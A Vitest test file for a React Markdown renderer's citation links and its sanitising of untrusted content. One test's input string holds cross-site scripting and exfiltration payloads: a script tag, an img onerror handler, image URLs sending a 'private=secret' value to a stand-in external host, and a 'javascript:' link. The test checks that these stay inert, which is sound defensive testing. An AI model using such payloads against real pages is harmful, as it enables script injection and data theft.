// @vitest-environment jsdom
import "@testing-library/jest-dom/vitest";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, expect, it, vi } from "vitest";
import { AnswerMarkdown } from "./AnswerMarkdown";
afterEach(cleanup);
it("keeps pointer and keyboard citation callbacks when a resolver has no href yet", () => {
  const onCite = vi.fn();
  render(<AnswerMarkdown text="The plan [1]." hot={null} setHot={() => {}} citeHref={() => undefined} onCite={onCite} />);
  const cite = screen.getByRole("button", { name: "1" });
  fireEvent.click(cite); fireEvent.keyDown(cite, { key: "Enter" }); fireEvent.keyDown(cite, { key: " " });
  expect(onCite.mock.calls).toEqual([[1], [1], [1]]);
});
it("keeps unresolved citations passive when there is no callback", () => {
  const view = render(<AnswerMarkdown text="The plan [1]." hot={null} setHot={() => {}} citeHref={() => undefined} />);
  expect(screen.queryByRole("button")).not.toBeInTheDocument(); expect(screen.queryByRole("link")).not.toBeInTheDocument();
  const onCite = vi.fn(); view.rerender(<AnswerMarkdown text="The plan [1]." hot={null} setHot={() => {}} citeHref={() => undefined} onCite={onCite} />);
  fireEvent.click(screen.getByRole("button", { name: "1" })); expect(onCite).toHaveBeenCalledWith(1);
});

it("opens ordinary native-link clicks in the drawer and leaves modifier clicks alone", () => {
  const onCite = vi.fn();
  render(<AnswerMarkdown text="The plan [1]." hot={null} setHot={() => {}} citeHref={() => "#captured-source"} onCite={onCite} />);
  const cite = screen.getByRole("link", { name: "Open source 1" });
  expect(fireEvent.click(cite)).toBe(false);
  expect(onCite).toHaveBeenCalledExactlyOnceWith(1);
  for (const modifier of ["ctrlKey", "metaKey", "shiftKey", "altKey"]) {
    expect(fireEvent.click(cite, { [modifier]: true })).toBe(true);
  }
  expect(onCite).toHaveBeenCalledTimes(1);
  expect(cite).toHaveAttribute("href", "#captured-source");
});

it("keeps a legacy citation navigable when the caller has no drawer evidence", () => {
  const onCite = vi.fn().mockReturnValue(false);
  render(<AnswerMarkdown text="Legacy [1]." hot={null} setHot={() => {}} citeHref={() => "#legacy-source"} onCite={onCite} />);
  expect(fireEvent.click(screen.getByRole("link", { name: "Open source 1" }))).toBe(true);
  expect(onCite).toHaveBeenCalledWith(1);
});

it("keeps untrusted HTML and Markdown image URLs inert while ordinary links and exact citations remain usable", () => {
  const view = render(<AnswerMarkdown text={'<script>globalThis.steal()</script>\n\n<img src="https://external.invalid/?private=secret" onerror="steal()">\n\n![Diagram](https://external.invalid/image?private=secret)\n\n![inline](data:image/svg+xml,evil)\n\n[unsafe](javascript:steal) [safe](https://example.test/docs) Saved [1].\n\n```html\n<img src="captured-original">\n```'} hot={null} setHot={() => {}} citeHref={() => "/source?source_item_id=saved&version_id=exact&passage_id=retained"} />);
  expect(view.container.querySelector("img,script,iframe,object,embed")).toBeNull();
  expect(screen.getByText('<img src="captured-original">', { selector: "code" })).toBeInTheDocument();
  expect(view.container.querySelector('[src], [onerror], [onclick]')).toBeNull();
  expect(screen.getByText("[Image omitted: Diagram]")).toBeInTheDocument();
  expect(screen.queryByRole("link", { name: "unsafe" })).not.toBeInTheDocument();
  expect(screen.getByText("unsafe")).toBeInTheDocument();
  const ordinary = screen.getByRole("link", { name: "safe" });
  expect(ordinary).toHaveAttribute("href", "https://example.test/docs"); expect(ordinary).toHaveAttribute("rel", "noreferrer noopener");
  expect(screen.getByRole("link", { name: "Open source 1" })).toHaveAttribute("href", "/source?source_item_id=saved&version_id=exact&passage_id=retained");
});
